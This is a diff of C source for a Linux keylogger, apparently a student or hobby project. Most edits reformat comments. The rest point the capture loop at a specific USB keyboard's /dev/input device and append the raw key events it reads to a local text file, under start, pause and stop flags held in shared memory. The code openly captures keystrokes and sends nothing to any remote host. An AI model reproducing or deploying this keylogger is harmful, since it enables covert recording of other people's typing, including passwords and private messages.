@@ -9,7 +9,7 @@
 #include "keylogger.h"
 #include "../include/types.h"
 
-#define UAM_KEYBOARD "/dev/input/event5"
+#define KEYBOARD_PATH "/dev/input/by-id/usb-CM_Storm_Keyboard_--_Trigger_Z_gaming-event-kbd"
 
 typedef struct
 {
@@ -17,12 +17,9 @@ typedef struct
 	int keylogger_capture;
 } sharedMemoryKeylogger;
 
-/**
- * keylogger_allow puts the flag capture to 1. Only works if keylogger has been initialized
- */
 void keylogger_allow()
 {
-	/*open the shared memory*/
+	// open the shared memory
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);
 
 	if (fd_shm == -1)
@@ -34,7 +31,7 @@ void keylogger_allow()
 		return;
 	}
 
-	/* Map the memory segment */
+	// Map the memory segment
 	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);
 
 	if (aux == MAP_FAILED)
@@ -52,12 +49,9 @@ void keylogger_allow()
 	return;
 }
 
-/**
- * keylogger_deny puts the flag capture to 0. Only works if keylogger has been initialized
- */
 void keylogger_deny()
 {
-	/*open the shared memory*/
+	// Open the shared memory
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);
 
 	if (fd_shm == -1)
@@ -69,7 +63,7 @@ void keylogger_deny()
 		return;
 	}
 
-	/* Map the memory segment */
+	// Map the memory segment
 	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);
 
 	if (aux == MAP_FAILED)
@@ -87,12 +81,9 @@ void keylogger_deny()
 	return;
 }
 
-/**
- * end the keylogging proccess. Only works if the keylogger has been initialized.
- */
 void keylogger_end()
 {
-	/*open the shared memory*/
+	// Open the shared memory
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);
 
 	if (fd_shm == -1)
@@ -104,7 +95,7 @@ void keylogger_end()
 		return;
 	}
 
-	/* Map the memory segment */
+	// Map the memory segment
 	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);
 
 	if (aux == MAP_FAILED)
@@ -127,15 +118,15 @@ int keylogger_init()
 	struct input_event ev[64];
 	int i;
 	int keybrdToCapture;
-	char path[] = UAM_KEYBOARD;
+	char path[] = KEYBOARD_PATH;
 	FILE *file;
 
-	/*___________________________________________________________*/
-	/*_______initialize the shared memory with some flags________*/
-	/*___________________________________________________________*/
+	// Initialize the shared memory with some flags
 
-	/*Create the shared memory. It's created in keylogger_init, so if we try to
-	change the flags with other function it won't work because the flags doesn't exist*/
+	/**
+	 * Create the shared memory. It's created in keylogger_init, so if we try to
+	 * change the flags with other function it won't work because the flags don't exist
+	 */
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
 	if (fd_shm == -1)
 	{
@@ -145,7 +136,7 @@ int keylogger_init()
 		return ERROR;
 	}
 
-	/*resizing shared memory*/
+	// Resizing shared memory
 	int error = ftruncate(fd_shm, sizeof(sharedMemoryKeylogger));
 
 	if (error == -1)
@@ -156,7 +147,8 @@ int keylogger_init()
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
-	/* mapping shared memory */
+
+	// Mapping shared memory
 	sharedMemoryKeylogger *shared_memory = mmap(NULL, sizeof(*shared_memory),
 												PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
 	if (shared_memory == MAP_FAILED)
@@ -168,14 +160,11 @@ int keylogger_init()
 		return ERROR;
 	}
 
-	/*Now the shared memory has been created, so we initialize it*/
+	// Now the shared memory has been created, so we initialize it
 	shared_memory->keylogger_capture = 1;
 	shared_memory->keylogger_finish = 0;
 
-	/*___________________________________________________________*/
-	/*__________________configure the keylogger__________________*/
-	/*___________________________________________________________*/
-
+	// Configure the keylogger
 	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
 	{
 #ifdef DEBUG
@@ -185,19 +174,23 @@ int keylogger_init()
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
-	/*If the keylogger hasn't finished the loop will continue working*/
+
+	// If the keylogger hasn't finished the loop will continue working
 	while (shared_memory->keylogger_finish == 0)
 	{
-		/*only capture if it's allowed.
-		Interblock is avoid using a conditional sentence.
-		If keylogger_capture is not allowed then the loop repeats itself but nothing happens.*/
+		/**
+		 * Only capture if it's allowed.
+		 * Interblock is avoid using a conditional sentence.
+		 * If keylogger_capture is not allowed then the loop repeats itself but nothing happens.
+		 */
+
 		if (shared_memory->keylogger_capture == 1)
 		{
 			rb = read(keybrdToCapture, ev, sizeof(struct input_event) * 64);
 
 			for (i = 0; i < (int)(rb / sizeof(struct input_event)); i++)
 			{
-				file = fopen(BL, "ab+");
+				file = fopen("keylogger_data.txt", "ab+");
 				if (!file)
 				{
 #ifdef DEBUG
@@ -218,7 +211,7 @@ int keylogger_init()
 		}
 	}
 
-	/*free shared memory*/
+	// Free shared memory
 	munmap(shared_memory, sizeof(*shared_memory));
 	shm_unlink(SHM_KEYLOGGER);
 
